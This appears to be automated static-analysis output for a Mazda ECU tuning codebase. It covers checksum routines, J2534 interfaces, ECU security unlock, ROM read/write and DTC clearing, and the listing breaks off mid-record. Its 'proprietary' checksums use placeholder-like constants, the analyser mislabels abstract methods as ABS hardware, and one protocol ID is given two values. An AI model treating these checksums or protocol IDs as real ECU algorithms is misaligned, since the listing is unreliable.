{"file_path": "muts_tuner/complete_tuner/mds9.py", "lines_read": 258, "features_found": [{"type": "function", "name": "__init__", "line": 31}, {"type": "function", "name": "calculate_checksum", "line": 41}, {"type": "function", "name": "_calculate_simple_sum", "line": 70}, {"type": "function", "name": "_calculate_crc16", "line": 78}, {"type": "function", "name": "_calculate_crc32", "line": 92}, {"type": "function", "name": "_calculate_mazda_proprietary", "line": 105}, {"type": "function", "name": "_calculate_bootloader_checksum", "line": 115}, {"type": "function", "name": "_calculate_calibration_checksum", "line": 126}, {"type": "function", "name": "verify_checksum", "line": 140}, {"type": "function", "name": "calculate_ecu_checksum", "line": 165}, {"type": "function", "name": "_calculate_l3k9_checksum", "line": 191}, {"type": "function", "name": "_calculate_lf9a_checksum", "line": 204}, {"type": "function", "name": "patch_checksum", "line": 215}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "List,", "line": null}, {"type": "import", "module": "IntEnum", "line": null}], "components_found": [{"type": "class", "name": "ChecksumType", "line": 16}, {"type": "class", "name": "MazdaChecksumCalculator", "line": 25}], "algorithms": [{"type": "algorithm_function", "line": 41, "content": "def calculate_checksum(self, data: bytes, checksum_type: ChecksumType,"}, {"type": "algorithm_function", "line": 70, "content": "def _calculate_simple_sum(self, data: bytes, start_address: int = 0,"}, {"type": "algorithm_function", "line": 78, "content": "def _calculate_crc16(self, data: bytes, start_address: int = 0,"}, {"type": "algorithm_function", "line": 92, "content": "def _calculate_crc32(self, data: bytes, start_address: int = 0,"}, {"type": "algorithm_function", "line": 105, "content": "def _calculate_mazda_proprietary(self, data: bytes, start_address: int = 0,"}, {"type": "algorithm_function", "line": 115, "content": "def _calculate_bootloader_checksum(self, data: bytes, start_address: int = 0,"}, {"type": "algorithm_function", "line": 126, "content": "def _calculate_calibration_checksum(self, data: bytes, start_address: int = 0,"}, {"type": "algorithm_function", "line": 165, "content": "def calculate_ecu_checksum(self, ecu_data: bytes, ecu_type: str) -> int:"}, {"type": "algorithm_function", "line": 191, "content": "def _calculate_l3k9_checksum(self, ecu_data: bytes) -> int:"}, {"type": "algorithm_function", "line": 204, "content": "def _calculate_lf9a_checksum(self, ecu_data: bytes) -> int:"}], "protocols": [{"type": "protocol", "line": 18, "protocol": "0x[0-9A-Fa-f]+", "content": "SIMPLE_SUM = 0x01"}, {"type": "protocol", "line": 19, "protocol": "0x[0-9A-Fa-f]+", "content": "CRC16 = 0x02"}, {"type": "protocol", "line": 20, "protocol": "0x[0-9A-Fa-f]+", "content": "CRC32 = 0x03"}, {"type": "protocol", "line": 21, "protocol": "0x[0-9A-Fa-f]+", "content": "MAZDA_PROPRIETARY = 0x04"}, {"type": "protocol", "line": 22, "protocol": "0x[0-9A-Fa-f]+", "content": "BOOTLOADER_CHECKSUM = 0x05"}, {"type": "protocol", "line": 23, "protocol": "0x[0-9A-Fa-f]+", "content": "CALIBRATION_CHECKSUM = 0x06"}, {"type": "protocol", "line": 75, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum = (checksum + byte) & 0xFF"}, {"type": "protocol", "line": 81, "protocol": "0x[0-9A-Fa-f]+", "content": "crc = 0xFFFF"}, {"type": "protocol", "line": 85, "protocol": "0x[0-9A-Fa-f]+", "content": "if crc & 0x8000:"}, {"type": "protocol", "line": 86, "protocol": "0x[0-9A-Fa-f]+", "content": "crc = (crc << 1) ^ 0x1021"}, {"type": "protocol", "line": 89, "protocol": "0x[0-9A-Fa-f]+", "content": "crc &= 0xFFFF"}, {"type": "protocol", "line": 95, "protocol": "0x[0-9A-Fa-f]+", "content": "crc = 0xFFFFFFFF"}, {"type": "protocol", "line": 100, "protocol": "0x[0-9A-Fa-f]+", "content": "crc = (crc >> 1) ^ 0xEDB88320"}, {"type": "protocol", "line": 103, "protocol": "0x[0-9A-Fa-f]+", "content": "return crc ^ 0xFFFFFFFF"}, {"type": "protocol", "line": 111, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum = (checksum + byte + i) & 0xFFFF"}, {"type": "protocol", "line": 112, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum = ((checksum << 3) | (checksum >> 13)) & 0xFFFF"}, {"type": "protocol", "line": 119, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum = 0xA5A5"}, {"type": "protocol", "line": 122, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum = ((checksum << 1) | (checksum >> 15)) & 0xFFFF"}, {"type": "protocol", "line": 123, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum = (checksum + 0x1234) & 0xFFFF"}, {"type": "protocol", "line": 135, "protocol": "0x[0-9A-Fa-f]+", "content": "block_sum = sum(block) & 0xFFFF"}, {"type": "protocol", "line": 136, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum = (checksum + block_sum) & 0xFFFFFFFF"}, {"type": "protocol", "line": 194, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum = 0x12345678"}, {"type": "protocol", "line": 202, "protocol": "0x[0-9A-Fa-f]+", "content": "return checksum & 0xFFFFFFFF"}, {"type": "protocol", "line": 210, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum = (checksum + byte * 0x13) & 0xFFFFFFFF"}, {"type": "protocol", "line": 248, "protocol": "0x[0-9A-Fa-f]+", "content": "patched_data[checksum_address:checksum_address+2] = struct.pack('>H', checksum & 0xFFFF)"}, {"type": "protocol", "line": 251, "protocol": "0x[0-9A-Fa-f]+", "content": "patched_data[checksum_address] = checksum & 0xFF"}], "hardware_assumptions": [{"type": "hardware", "line": 28, "hardware": "ECU", "content": "Implements all checksum algorithms used in Mazda ECUs"}, {"type": "hardware", "line": 165, "hardware": "ECU", "content": "def calculate_ecu_checksum(self, ecu_data: bytes, ecu_type: str) -> int:"}, {"type": "hardware", "line": 167, "hardware": "ECU", "content": "Calculate complete ECU checksum based on ECU type"}, {"type": "hardware", "line": 170, "hardware": "ECU", "content": "ecu_data: Complete ECU data"}, {"type": "hardware", "line": 171, "hardware": "ECU", "content": "ecu_type: ECU type identifier"}, {"type": "hardware", "line": 174, "hardware": "ECU", "content": "ECU checksum"}, {"type": "hardware", "line": 177, "hardware": "ECU", "content": "if ecu_type.startswith(\"L3K9\"):"}, {"type": "hardware", "line": 179, "hardware": "ECU", "content": "return self._calculate_l3k9_checksum(ecu_data)"}, {"type": "hardware", "line": 180, "hardware": "ECU", "content": "elif ecu_type.startswith(\"LF9A\"):"}, {"type": "hardware", "line": 182, "hardware": "ECU", "content": "return self._calculate_lf9a_checksum(ecu_data)"}, {"type": "hardware", "line": 185, "hardware": "ECU", "content": "return self._calculate_mazda_proprietary(ecu_data)"}, {"type": "hardware", "line": 188, "hardware": "ECU", "content": "logger.error(f\"Error calculating ECU checksum: {e}\")"}, {"type": "hardware", "line": 191, "hardware": "ECU", "content": "def _calculate_l3k9_checksum(self, ecu_data: bytes) -> int:"}, {"type": "hardware", "line": 192, "hardware": "ECU", "content": "\"\"\"Calculate checksum for L3K9 series ECUs\"\"\""}, {"type": "hardware", "line": 196, "hardware": "ECU", "content": "for i in range(0, len(ecu_data), 4):"}, {"type": "hardware", "line": 197, "hardware": "ECU", "content": "if i + 4 <= len(ecu_data):"}, {"type": "hardware", "line": 198, "hardware": "ECU", "content": "word = struct.unpack_from('>I', ecu_data, i)[0]"}, {"type": "hardware", "line": 204, "hardware": "ECU", "content": "def _calculate_lf9a_checksum(self, ecu_data: bytes) -> int:"}, {"type": "hardware", "line": 205, "hardware": "ECU", "content": "\"\"\"Calculate checksum for LF9A series ECUs\"\"\""}, {"type": "hardware", "line": 209, "hardware": "ECU", "content": "for byte in ecu_data:"}], "security_logic": [{"type": "security_pattern", "line": 4, "pattern": "algorithm", "content": "MAZDA CHECKSUM CALCULATOR - Complete Checksum Algorithms"}, {"type": "security_pattern", "line": 9, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 28, "pattern": "algorithm", "content": "Implements all checksum algorithms used in Mazda ECUs"}, {"type": "security_pattern", "line": 32, "pattern": "algorithm", "content": "self.checksum_algorithms = {"}, {"type": "security_pattern", "line": 44, "pattern": "algorithm", "content": "Calculate checksum for data using specified algorithm"}, {"type": "security_pattern", "line": 49, "pattern": "algorithm", "content": "start_address: Starting address (for some algorithms)"}, {"type": "security_pattern", "line": 50, "pattern": "algorithm", "content": "length: Data length (for some algorithms)"}, {"type": "security_pattern", "line": 56, "pattern": "algorithm", "content": "if checksum_type not in self.checksum_algorithms:"}, {"type": "security_pattern", "line": 60, "pattern": "algorithm", "content": "algorithm = self.checksum_algorithms[checksum_type]"}, {"type": "security_pattern", "line": 61, "pattern": "algorithm", "content": "checksum = algorithm(data, start_address, length)"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts_tuner/complete_tuner/mds_compatibility.py", "lines_read": 117, "features_found": [{"type": "function", "name": "__init__", "line": 30}, {"type": "function", "name": "_setup_platform_compatibility", "line": 34}, {"type": "function", "name": "_setup_class_adapters", "line": 51}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "mds6", "line": null}, {"type": "import", "module": "mds6", "line": null}, {"type": "import", "module": "mds8", "line": null}, {"type": "import", "module": "mds9", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "platform", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "IntEnum", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "ctypes", "line": null}, {"type": "import", "module": "types", "line": null}, {"type": "import", "module": "J2534Error", "line": null}, {"type": "import", "module": "J2534Error:", "line": null}, {"type": "import", "module": "J2534Protocol", "line": null}, {"type": "import", "module": "J2534Protocol:", "line": null}, {"type": "import", "module": "MapAdjustment", "line": null}, {"type": "import", "module": "MapAdjustment:", "line": null}, {"type": "import", "module": "ChecksumType", "line": null}, {"type": "import", "module": "ChecksumType:", "line": null}], "components_found": [{"type": "class", "name": "CalibrationValidationResult", "line": 22}, {"type": "class", "name": "MDSCompatibilityLayer", "line": 27}, {"type": "class", "name": "J2534Error", "line": 60}, {"type": "class", "name": "J2534Protocol", "line": 71}, {"type": "class", "name": "MapAdjustment", "line": 83}, {"type": "class", "name": "ChecksumType", "line": 96}], "algorithms": [], "protocols": [{"type": "protocol", "line": 55, "protocol": "J2534", "content": "from mds6 import J2534Error as _J2534Error"}, {"type": "protocol", "line": 56, "protocol": "J2534", "content": "self.J2534Error = _J2534Error"}, {"type": "protocol", "line": 58, "protocol": "J2534", "content": "logger.warning(f\"Could not import J2534Error: {e}\")"}, {"type": "protocol", "line": 60, "protocol": "J2534", "content": "class J2534Error(IntEnum):"}, {"type": "protocol", "line": 61, "protocol": "0x[0-9A-Fa-f]+", "content": "STATUS_NOERROR = 0x00"}, {"type": "protocol", "line": 62, "protocol": "0x[0-9A-Fa-f]+", "content": "ERR_FAILED = 0x07"}, {"type": "protocol", "line": 63, "protocol": "J2534", "content": "self.J2534Error = J2534Error"}, {"type": "protocol", "line": 66, "protocol": "J2534", "content": "from mds6 import J2534Protocol as _J2534Protocol"}, {"type": "protocol", "line": 67, "protocol": "J2534", "content": "self.J2534Protocol = _J2534Protocol"}, {"type": "protocol", "line": 69, "protocol": "J2534", "content": "logger.warning(f\"Could not import J2534Protocol: {e}\")"}, {"type": "protocol", "line": 71, "protocol": "J2534", "content": "class J2534Protocol(IntEnum):"}, {"type": "protocol", "line": 72, "protocol": "0x[0-9A-Fa-f]+", "content": "ISO15765 = 0x06"}, {"type": "protocol", "line": 73, "protocol": "0x[0-9A-Fa-f]+", "content": "ISO9141 = 0x02"}, {"type": "protocol", "line": 74, "protocol": "J2534", "content": "self.J2534Protocol = J2534Protocol"}, {"type": "protocol", "line": 110, "protocol": "J2534", "content": "J2534Error = compatibility.J2534Error"}, {"type": "protocol", "line": 111, "protocol": "J2534", "content": "J2534Protocol = compatibility.J2534Protocol"}], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts_tuner/complete_tuner/protocol_manager.py", "lines_read": 673, "features_found": [{"type": "import", "module": "abc", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "versa1", "line": null}, {"type": "import", "module": "versa2", "line": null}, {"type": "import", "module": "versa3", "line": null}, {"type": "import", "module": "j2534_interface", "line": null}, {"type": "import", "module": "ABC,", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "Enum", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "VersaTunerECU", "line": null}, {"type": "import", "module": "SecurityManager", "line": null}, {"type": "import", "module": "ROMOperations", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "J2534Interface,", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "time", "line": null}], "components_found": [], "algorithms": [], "protocols": [{"type": "protocol", "line": 19, "protocol": "J2534", "content": "MUTS_J2534 = \"muts_j2534\""}, {"type": "protocol", "line": 20, "protocol": "OBD", "content": "OBD2_STANDARD = \"obd2_standard\""}, {"type": "protocol", "line": 119, "protocol": "CAN", "content": "\"\"\"Connect using VersaTuner CAN protocol\"\"\""}, {"type": "protocol", "line": 157, "protocol": "0x[0-9A-Fa-f]+", "content": "service = message.data[0] if len(message.data) > 0 else 0x22"}, {"type": "protocol", "line": 158, "protocol": "0x[0-9A-Fa-f]+", "content": "subfunction = message.data[1] if len(message.data) > 1 else 0x00"}, {"type": "protocol", "line": 192, "protocol": "0x[0-9A-Fa-f]+", "content": "rpm = self.ecu.read_live_data(0x0C)"}, {"type": "protocol", "line": 193, "protocol": "0x[0-9A-Fa-f]+", "content": "speed = self.ecu.read_live_data(0x0D)"}, {"type": "protocol", "line": 194, "protocol": "0x[0-9A-Fa-f]+", "content": "throttle = self.ecu.read_live_data(0x11)"}, {"type": "protocol", "line": 195, "protocol": "0x[0-9A-Fa-f]+", "content": "coolant_temp = self.ecu.read_live_data(0x05)"}, {"type": "protocol", "line": 196, "protocol": "0x[0-9A-Fa-f]+", "content": "intake_temp = self.ecu.read_live_data(0x0F)"}, {"type": "protocol", "line": 199, "protocol": "0x[0-9A-Fa-f]+", "content": "boost = self.ecu.read_live_data(0x223365)"}, {"type": "protocol", "line": 287, "protocol": "CAN", "content": "\"description\": \"Mazdaspeed 3 CAN protocol\","}, {"type": "protocol", "line": 367, "protocol": "J2534", "content": "class MUTSJ2534Protocol(ECUProtocolInterface):"}, {"type": "protocol", "line": 368, "protocol": "J2534", "content": "\"\"\"MUTS J2534 protocol implementation\"\"\""}, {"type": "protocol", "line": 371, "protocol": "J2534", "content": "from j2534_interface import J2534Interface, J2534Protocol"}, {"type": "protocol", "line": 373, "protocol": "J2534", "content": "self.j2534 = J2534Interface()"}, {"type": "protocol", "line": 377, "protocol": "J2534", "content": "\"\"\"Connect using J2534 protocol\"\"\""}, {"type": "protocol", "line": 383, "protocol": "CAN", "content": "protocol = J2534Protocol.ISO15765  # CAN protocol"}, {"type": "protocol", "line": 383, "protocol": "J2534", "content": "protocol = J2534Protocol.ISO15765  # CAN protocol"}, {"type": "protocol", "line": 391, "protocol": "J2534", "content": "logger.error(f\"MUTS J2534 connection failed: {e}\")"}, {"type": "protocol", "line": 395, "protocol": "J2534", "content": "\"\"\"Disconnect J2534 protocol\"\"\""}, {"type": "protocol", "line": 401, "protocol": "J2534", "content": "logger.error(f\"MUTS J2534 disconnect failed: {e}\")"}, {"type": "protocol", "line": 405, "protocol": "J2534", "content": "\"\"\"Send message using J2534 protocol\"\"\""}, {"type": "protocol", "line": 412, "protocol": "J2534", "content": "logger.error(f\"MUTS J2534 send failed: {e}\")"}, {"type": "protocol", "line": 416, "protocol": "J2534", "content": "\"\"\"Read messages using J2534 protocol\"\"\""}, {"type": "protocol", "line": 426, "protocol": "J2534", "content": "protocol=ProtocolType.MUTS_J2534,"}, {"type": "protocol", "line": 436, "protocol": "J2534", "content": "logger.error(f\"MUTS J2534 read failed: {e}\")"}, {"type": "protocol", "line": 440, "protocol": "J2534", "content": "\"\"\"Read live data using J2534 protocol\"\"\""}, {"type": "protocol", "line": 461, "protocol": "J2534", "content": "logger.error(f\"MUTS J2534 live data failed: {e}\")"}, {"type": "protocol", "line": 465, "protocol": "J2534", "content": "\"\"\"Read VIN using J2534 protocol\"\"\""}, {"type": "protocol", "line": 471, "protocol": "0x[0-9A-Fa-f]+", "content": "vin_request = bytes([0x22, 0xF1, 0x89])"}, {"type": "protocol", "line": 479, "protocol": "0x[0-9A-Fa-f]+", "content": "if len(msg) >= 20 and msg[0] == 0x62:"}, {"type": "protocol", "line": 486, "protocol": "J2534", "content": "logger.error(f\"MUTS J2534 VIN read failed: {e}\")"}, {"type": "protocol", "line": 490, "protocol": "J2534", "content": "\"\"\"Read DTCs using J2534 protocol\"\"\""}, {"type": "protocol", "line": 496, "protocol": "0x[0-9A-Fa-f]+", "content": "dtc_request = bytes([0x19, 0x01])  # Read current DTCs"}, {"type": "protocol", "line": 505, "protocol": "0x[0-9A-Fa-f]+", "content": "if len(msg) >= 4 and msg[0] == 0x59:"}, {"type": "protocol", "line": 509, "protocol": "0x[0-9A-Fa-f]+", "content": "if dtc_data[i] == 0x00 and dtc_data[i+1] == 0x00:"}, {"type": "protocol", "line": 525, "protocol": "J2534", "content": "logger.error(f\"MUTS J2534 DTC read failed: {e}\")"}, {"type": "protocol", "line": 536, "protocol": "0x[0-9A-Fa-f]+", "content": "dtc_type = (first_byte >> 6) & 0x03"}, {"type": "protocol", "line": 537, "protocol": "0x[0-9A-Fa-f]+", "content": "digit1 = (first_byte >> 4) & 0x03"}, {"type": "protocol", "line": 538, "protocol": "0x[0-9A-Fa-f]+", "content": "digit2 = first_byte & 0x0F"}, {"type": "protocol", "line": 539, "protocol": "0x[0-9A-Fa-f]+", "content": "digit3 = (second_byte >> 4) & 0x0F"}, {"type": "protocol", "line": 540, "protocol": "0x[0-9A-Fa-f]+", "content": "digit4 = second_byte & 0x0F"}, {"type": "protocol", "line": 548, "protocol": "J2534", "content": "\"\"\"Clear DTCs using J2534 protocol\"\"\""}, {"type": "protocol", "line": 554, "protocol": "0x[0-9A-Fa-f]+", "content": "clear_request = bytes([0x14, 0xFF])"}, {"type": "protocol", "line": 558, "protocol": "J2534", "content": "logger.error(f\"MUTS J2534 DTC clear failed: {e}\")"}, {"type": "protocol", "line": 562, "protocol": "J2534", "content": "\"\"\"Read ROM using J2534 protocol\"\"\""}, {"type": "protocol", "line": 572, "protocol": "J2534", "content": "logger.error(f\"MUTS J2534 ROM read failed: {e}\")"}, {"type": "protocol", "line": 576, "protocol": "J2534", "content": "\"\"\"Write ROM using J2534 protocol\"\"\""}, {"type": "protocol", "line": 586, "protocol": "J2534", "content": "logger.error(f\"MUTS J2534 ROM write failed: {e}\")"}, {"type": "protocol", "line": 590, "protocol": "J2534", "content": "\"\"\"Get MUTS J2534 protocol info\"\"\""}, {"type": "protocol", "line": 592, "protocol": "J2534", "content": "\"name\": \"MUTS J2534\","}, {"type": "protocol", "line": 593, "protocol": "J2534", "content": "\"type\": ProtocolType.MUTS_J2534.value,"}, {"type": "protocol", "line": 594, "protocol": "J2534", "content": "\"description\": \"J2534 Pass-thru interface\","}, {"type": "protocol", "line": 595, "protocol": "J2534", "content": "\"supported_vehicles\": [\"J2534 compatible vehicles\"],"}, {"type": "protocol", "line": 606, "protocol": "J2534", "content": "ProtocolType.MUTS_J2534: MUTSJ2534Protocol(),"}], "hardware_assumptions": [{"type": "hardware", "line": 3, "hardware": "ECU", "content": "Complete ECU Protocol Manager"}, {"type": "hardware", "line": 7, "hardware": "ABS", "content": "from abc import ABC, abstractmethod"}, {"type": "hardware", "line": 16, "hardware": "ECU", "content": "\"\"\"Supported ECU communication protocols\"\"\""}, {"type": "hardware", "line": 23, "hardware": "ECU", "content": "class ECUMessage:"}, {"type": "hardware", "line": 24, "hardware": "ECU", "content": "\"\"\"Unified ECU message structure\"\"\""}, {"type": "hardware", "line": 47, "hardware": "ECU", "content": "class ECUProtocolInterface(ABC):"}, {"type": "hardware", "line": 48, "hardware": "ECU", "content": "\"\"\"Abstract interface for all ECU protocols\"\"\""}, {"type": "hardware", "line": 48, "hardware": "ABS", "content": "\"\"\"Abstract interface for all ECU protocols\"\"\""}, {"type": "hardware", "line": 50, "hardware": "ABS", "content": "@abstractmethod"}, {"type": "hardware", "line": 52, "hardware": "ECU", "content": "\"\"\"Connect to ECU using specific protocol\"\"\""}, {"type": "hardware", "line": 55, "hardware": "ABS", "content": "@abstractmethod"}, {"type": "hardware", "line": 57, "hardware": "ECU", "content": "\"\"\"Disconnect from ECU\"\"\""}, {"type": "hardware", "line": 60, "hardware": "ABS", "content": "@abstractmethod"}, {"type": "hardware", "line": 61, "hardware": "ECU", "content": "async def send_message(self, message: ECUMessage) -> bool:"}, {"type": "hardware", "line": 62, "hardware": "ECU", "content": "\"\"\"Send message to ECU\"\"\""}, {"type": "hardware", "line": 65, "hardware": "ABS", "content": "@abstractmethod"}, {"type": "hardware", "line": 66, "hardware": "ECU", "content": "async def read_messages(self, timeout_ms: int = 100) -> List[ECUMessage]:"}, {"type": "hardware", "line": 67, "hardware": "ECU", "content": "\"\"\"Read messages from ECU\"\"\""}, {"type": "hardware", "line": 70, "hardware": "ABS", "content": "@abstractmethod"}, {"type": "hardware", "line": 72, "hardware": "ECU", "content": "\"\"\"Read live ECU data\"\"\""}, {"type": "hardware", "line": 75, "hardware": "ABS", "content": "@abstractmethod"}, {"type": "hardware", "line": 77, "hardware": "vehicle", "content": "\"\"\"Read vehicle VIN\"\"\""}, {"type": "hardware", "line": 80, "hardware": "ABS", "content": "@abstractmethod"}, {"type": "hardware", "line": 85, "hardware": "ABS", "content": "@abstractmethod"}, {"type": "hardware", "line": 90, "hardware": "ABS", "content": "@abstractmethod"}, {"type": "hardware", "line": 92, "hardware": "ECU", "content": "\"\"\"Read ECU ROM\"\"\""}, {"type": "hardware", "line": 95, "hardware": "ABS", "content": "@abstractmethod"}, {"type": "hardware", "line": 97, "hardware": "ECU", "content": "\"\"\"Write ROM to ECU\"\"\""}, {"type": "hardware", "line": 100, "hardware": "ABS", "content": "@abstractmethod"}, {"type": "hardware", "line": 105, "hardware": "ECU", "content": "class VersaTunerProtocol(ECUProtocolInterface):"}, {"type": "hardware", "line": 109, "hardware": "ECU", "content": "from versa1 import VersaTunerECU"}, {"type": "hardware", "line": 110, "hardware": "ECU", "content": "from versa2 import SecurityManager"}, {"type": "hardware", "line": 113, "hardware": "ECU", "content": "self.ecu = VersaTunerECU()"}, {"type": "hardware", "line": 114, "hardware": "ECU", "content": "self.security = SecurityManager(self.ecu)"}, {"type": "hardware", "line": 115, "hardware": "ECU", "content": "self.rom_ops = ROMOperations(self.ecu)"}, {"type": "hardware", "line": 124, "hardware": "ECU", "content": "self.ecu.interface = interface"}, {"type": "hardware", "line": 125, "hardware": "ECU", "content": "self.ecu.bitrate = bitrate"}, {"type": "hardware", "line": 127, "hardware": "ECU", "content": "result = self.ecu.connect()"}, {"type": "hardware", "line": 130, "hardware": "ECU", "content": "security_result = self.security.unlock_ecu()"}, {"type": "hardware", "line": 131, "hardware": "ECU", "content": "self.is_connected = security_result"}, {"type": "hardware", "line": 143, "hardware": "ECU", "content": "self.ecu.disconnect()"}, {"type": "hardware", "line": 150, "hardware": "ECU", "content": "async def send_message(self, message: ECUMessage) -> bool:"}, {"type": "hardware", "line": 161, "hardware": "ECU", "content": "response = self.ecu.send_request(service, subfunction, data)"}, {"type": "hardware", "line": 168, "hardware": "ECU", "content": "async def read_messages(self, timeout_ms: int = 100) -> List[ECUMessage]:"}, {"type": "hardware", "line": 192, "hardware": "ECU", "content": "rpm = self.ecu.read_live_data(0x0C)"}, {"type": "hardware", "line": 193, "hardware": "ECU", "content": "speed = self.ecu.read_live_data(0x0D)"}, {"type": "hardware", "line": 194, "hardware": "ECU", "content": "throttle = self.ecu.read_live_data(0x11)"}, {"type": "hardware", "line": 195, "hardware": "ECU", "content": "coolant_temp = self.ecu.read_live_data(0x05)"}, {"type": "hardware", "line": 196, "hardware": "ECU", "content": "intake_temp = self.ecu.read_live_data(0x0F)"}, {"type": "hardware", "line": 199, "hardware": "ECU", "content": "boost = self.ecu.read_live_data(0x223365)"}, {"type": "hardware", "line": 221, "hardware": "ECU", "content": "return self.ecu.read_vin()"}, {"type": "hardware", "line": 232, "hardware": "ECU", "content": "return self.ecu.read_dtcs()"}, {"type": "hardware", "line": 243, "hardware": "ECU", "content": "return self.ecu.clear_dtcs()"}, {"type": "hardware", "line": 288, "hardware": "vehicle", "content": "\"supported_vehicles\": [\"Mazdaspeed 3 2010-2013\"],"}, {"type": "hardware", "line": 289, "hardware": "ECU", "content": "\"features\": [\"ROM read/write\", \"Live data\", \"Diagnostics\", \"Security access\"]"}, {"type": "hardware", "line": 292, "hardware": "ECU", "content": "class CobbProtocol(ECUProtocolInterface):"}, {"type": "hardware", "line": 321, "hardware": "ECU", "content": "async def send_message(self, message: ECUMessage) -> bool:"}, {"type": "hardware", "line": 326, "hardware": "ECU", "content": "async def read_messages(self, timeout_ms: int = 100) -> List[ECUMessage]:"}, {"type": "hardware", "line": 363, "hardware": "vehicle", "content": "\"supported_vehicles\": [\"Subaru\", \"Mazda\", \"Mitsubishi\", \"Nissan\"],"}, {"type": "hardware", "line": 367, "hardware": "ECU", "content": "class MUTSJ2534Protocol(ECUProtocolInterface):"}, {"type": "hardware", "line": 404, "hardware": "ECU", "content": "async def send_message(self, message: ECUMessage) -> bool:"}, {"type": "hardware", "line": 415, "hardware": "ECU", "content": "async def read_messages(self, timeout_ms: int = 100) -> List[ECUMessage]:"}, {"type": "hardware", "line": 425, "hardware": "ECU", "content": "ecu_msg = ECUMessage("}, {"type": "hardware", "line": 431, "hardware": "ECU", "content": "messages.append(ecu_msg)"}, {"type": "hardware", "line": 595, "hardware": "vehicle", "content": "\"supported_vehicles\": [\"J2534 compatible vehicles\"],"}, {"type": "hardware", "line": 600, "hardware": "ECU", "content": "\"\"\"Unified protocol manager for all ECU communication\"\"\""}, {"type": "hardware", "line": 608, "hardware": "ECU", "content": "self.current_protocol: Optional[ECUProtocolInterface] = None"}, {"type": "hardware", "line": 651, "hardware": "ECU", "content": "def get_current_protocol(self) -> Optional[ECUProtocolInterface]:"}, {"type": "hardware", "line": 668, "hardware": "ECU", "content": "\"\"\"Check if connected to ECU\"\"\""}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts_tuner/complete_tuner/utils.py", "lines_read": 13, "features_found": [{"type": "function", "name": "get_logger", "line": 10}, {"type": "import", "module": "logging", "line": null}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts_tuner/j2534_interface.py", "lines_read": 529, "features_found": [{"type": "function", "name": "test_j2534_interface", "line": 485}, {"type": "function", "name": "__init__", "line": 88}, {"type": "function", "name": "_load_dll", "line": 111}, {"type": "function", "name": "_setup_functions", "line": 142}, {"type": "function", "name": "connect", "line": 200}, {"type": "function", "name": "open_channel", "line": 237}, {"type": "function", "name": "send_message", "line": 280}, {"type": "function", "name": "read_messages", "line": 332}, {"type": "function", "name": "_start_message_receiver", "line": 376}, {"type": "function", "name": "_message_receiver_loop", "line": 382}, {"type": "function", "name": "add_message_callback", "line": 394}, {"type": "function", "name": "remove_message_callback", "line": 398}, {"type": "function", "name": "_read_version_info", "line": 403}, {"type": "function", "name": "_get_error_string", "line": 425}, {"type": "function", "name": "disconnect", "line": 457}, {"type": "function", "name": "__del__", "line": 480}, {"type": "function", "name": "message_callback", "line": 505}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "ctypes", "line": null}, {"type": "import", "module": "platform", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "IntEnum", "line": null}, {"type": "import", "module": "threading", "line": null}, {"type": "import", "module": "logging", "line": null}], "components_found": [{"type": "class", "name": "J2534Protocol", "line": 20}, {"type": "class", "name": "J2534FilterType", "line": 33}, {"type": "class", "name": "J2534ErrorCode", "line": 39}, {"type": "class", "name": "J2534Message", "line": 70}, {"type": "class", "name": "J2534Interface", "line": 82}], "algorithms": [], "protocols": [{"type": "protocol", "line": 3, "protocol": "J2534", "content": "J2534 Interface Integration Layer"}, {"type": "protocol", "line": 4, "protocol": "J2534", "content": "Provides Windows DLL access for J2534 vehicle communication interfaces"}, {"type": "protocol", "line": 20, "protocol": "J2534", "content": "class J2534Protocol(IntEnum):"}, {"type": "protocol", "line": 21, "protocol": "J2534", "content": "\"\"\"J2534 Protocol IDs\"\"\""}, {"type": "protocol", "line": 22, "protocol": "0x[0-9A-Fa-f]+", "content": "J1850VPW = 0x01"}, {"type": "protocol", "line": 23, "protocol": "0x[0-9A-Fa-f]+", "content": "J1850PWM = 0x02"}, {"type": "protocol", "line": 24, "protocol": "0x[0-9A-Fa-f]+", "content": "ISO9141 = 0x03"}, {"type": "protocol", "line": 25, "protocol": "0x[0-9A-Fa-f]+", "content": "ISO14230 = 0x04"}, {"type": "protocol", "line": 26, "protocol": "CAN", "content": "CAN = 